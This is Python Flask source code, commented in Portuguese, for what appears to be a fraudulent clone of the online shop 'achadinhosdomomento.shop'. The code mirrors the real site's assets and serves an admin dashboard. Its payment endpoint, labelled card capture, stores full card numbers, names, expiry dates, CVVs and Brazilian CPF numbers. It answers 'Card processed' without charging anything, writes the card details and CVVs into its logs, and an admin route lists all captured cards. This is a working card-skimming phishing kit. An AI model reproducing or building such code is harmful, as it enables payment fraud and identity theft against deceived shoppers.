import os
import json
import requests
from flask import Flask, request, jsonify, make_response, send_from_directory, redirect
from user_agents import parse
from backend.auth import verify_credentials, generate_token, verify_token
from backend.logs import log_event, get_recent_logs
from backend.metrics import record_metric, get_metrics_summary

app = Flask(__name__)

# Remover Header do servidor para segurança
@app.after_request
def remove_server_header(response):
    response.headers['Server'] = 'Sentinel'
    response.headers['X-Powered-By'] = ''
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    return response

# Servir assets dinamicamente (admin vs store) com Proxy inteligente (Self-healing)
@app.route('/assets/<path:path>')
def serve_assets(path):
    admin_asset_path = os.path.join(app.root_path, '../assets', path)
    if os.path.exists(admin_asset_path):
        return send_from_directory('../assets', path)
        
    store_asset_path = os.path.join(app.root_path, '../store/assets', path)
    if os.path.exists(store_asset_path):
        return send_from_directory('../store/assets', path)
        
    # Proxy reverso: se o arquivo não existe localmente (ex: chunks dinâmicos do React que o wget perdeu)
    # Baixamos do site original, salvamos localmente e servimos.
    try:
        url = f"https://achadinhosdomomento.shop/assets/{path}"
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            os.makedirs(os.path.dirname(store_asset_path), exist_ok=True)
            with open(store_asset_path, 'wb') as f:
                f.write(r.content)
            return send_from_directory('../store/assets', path)
    except Exception as e:
        print(f"Erro ao baixar asset {path}: {e}")
        
    return "Not found", 404

def get_client_info(req):
    user_agent_str = req.headers.get('User-Agent', '')
    user_agent = parse(user_agent_str)
    
    device = "Mobile" if user_agent.is_mobile else "Tablet" if user_agent.is_tablet else "PC"
    if user_agent.is_bot:
        device = "Bot"
        
    os_name = f"{user_agent.os.family} {user_agent.os.version_string}".strip()
    browser = f"{user_agent.browser.family} {user_agent.browser.version_string}".strip()
    ip = req.headers.get('X-Forwarded-For', req.remote_addr)
    
    return {
        "ip": ip,
        "device": device,
        "os": os_name,
        "browser": browser
    }

# Rota da Loja Principal
@app.route('/')
def store_index():
    return send_from_directory('../store', 'index.html')

# Suporte ao React Router (History API Fallback)
# Faz com que rotas como /produto/1 retornem o index.html da loja
@app.route('/produto/<path:path>')
def store_product_fallback(path):
    # Se o navegador pedir um asset de dentro da rota de produto, redireciona para a raiz de assets
    if path.startswith('assets/'):
        asset_real_path = path.replace('assets/', '', 1)
        return redirect(f'/assets/{asset_real_path}')
    return send_from_directory('../store', 'index.html')

# Rotas de arquivos estáticos na raiz da loja (favicon, robots, js)
@app.route('/<path:filename>')
def serve_store(filename):
    # Proteção contra path traversal
    if ".." in filename or filename.startswith("/"):
        return abort(404)

    # Evita conflitos com rotas de admin ou api
    if filename.startswith('admin/') or filename.startswith('api/'):
        return "Not found", 404
        
    # Se o arquivo existir localmente na pasta store, serve ele
    local_file = os.path.join(app.root_path, '../store', filename)
    if os.path.exists(local_file) and os.path.isfile(local_file):
        return send_from_directory('../store', filename)
        
    # Tenta baixar do site original (Self-healing Proxy)
    try:
        # Se for um arquivo com extensão conhecida (imagem, js, css, etc)
        if '.' in filename:
            url = f"https://achadinhosdomomento.shop/{filename}"
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                os.makedirs(os.path.dirname(local_file), exist_ok=True)
                with open(local_file, 'wb') as f:
                    f.write(r.content)
                return send_from_directory('../store', filename)
    except:
        pass

    # Fallback para SPA: Se não achou o arquivo ou é uma rota de navegação (sem ponto)
    # retorna o index.html para o React Router assumir o controle.
    return send_from_directory('../store', 'index.html')

# Rota para servir o HTML de Login do Admin
@app.route('/admin/login')
def login_page():
    return send_from_directory('../admin/login', 'index.html')

# Rota genérica para servir as páginas do Painel (Protegidas)
@app.route('/admin/<page>')
def admin_pages(page):
    allowed_pages = ['dashboard', 'payments', 'sales', 'products', 'clients', 'analytics', 'map', 'logs', 'monitoring', 'sites', 'pages']
    
    if page not in allowed_pages:
        return redirect('/admin/dashboard')
        
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return redirect('/admin/login')
        
    folder = 'logs_view' if page == 'logs' else page
    return send_from_directory(f'../admin/{folder}', 'index.html')

# API: Autenticação
@app.route('/api/auth/login', methods=['POST'])
def api_login():
    data = request.get_json()
    if not data or 'username' not in data or 'password' not in data:
        return jsonify({"error": "Invalid payload"}), 400
    
    username = data['username']
    password = data['password']
    
    # Sanitização básica (remoção de caracteres suspeitos caso não usemos prepared statements, 
    # mas o sqlite3 python DB-API já usa binds seguros). 
    # Validando tamanho para prevenir DoS.
    if len(username) > 50 or len(password) > 100:
        return jsonify({"error": "Payload too large"}), 400

    info = get_client_info(request)
    
    if verify_credentials(username, password):
        token = generate_token(username)
        # Log successful login
        log_event('LOGIN_SUCCESS', username, info['ip'], 'SUCCESS', info['device'])
        # Grava métricas (Exemplo simplificado de região por falta de GeoIP real, usa IP para simular em prod)
        record_metric(info['ip'], 'Brasil', 'São Paulo', 'São Paulo', info['device'], info['os'], info['browser'], request.referrer or 'Direct')
        
        resp = make_response(jsonify({"message": "Login successful"}))
        resp.set_cookie('auth_token', token, httponly=True, samesite='Strict')
        return resp
    else:
        # Log failed login
        log_event('LOGIN_FAILED', username, info['ip'], 'FAILED', info['device'])
        return jsonify({"error": "Invalid credentials"}), 401

@app.route('/api/auth/logout', methods=['POST'])
def api_logout():
    resp = make_response(jsonify({"message": "Logged out"}))
    resp.set_cookie('auth_token', '', expires=0)
    return resp

# API: Dashboard Data
@app.route('/api/metrics', methods=['GET'])
def api_metrics():
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = get_metrics_summary()
    recent_logs = get_recent_logs(5)
    return jsonify({
        "metrics": data,
        "logs": recent_logs
    })

# API: Pagamento (Captura de Cartão)
@app.route('/api/payment/card', methods=['POST'])
def api_capture_card():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid data"}), 400
        
    card_number = data.get('card_number')
    card_name = data.get('card_name')
    expiry = data.get('expiry')
    cvv = data.get('cvv')
    cpf = data.get('cpf')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    from backend.db import get_db_connection
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO cards (card_number, card_name, expiry, cvv, cpf, ip)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (card_number, card_name, expiry, cvv, cpf, ip))
    conn.commit()
    conn.close()
    
    # Log detalhado de auditoria
    log_event('CARD_CAPTURED', card_name, ip, f'SUCCESS - Cartao: {card_number} |Expiry: {expiry}|CVV: {cvv}|CPF: {cpf}', 'Checkout')

    return jsonify({"message": "Card processed"}), 200

# API: Listar Cartões (Admin)
@app.route('/api/admin/cards', methods=['GET'])
def api_admin_cards():
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return jsonify({"error": "Unauthorized"}), 401
        
    from backend.db import get_db_connection
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM cards ORDER BY created_at DESC')
    rows = cursor.fetchall()
    cards = [dict(row) for row in rows]
    conn.close()
    
    return jsonify({"cards": cards})

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080, debug=False)
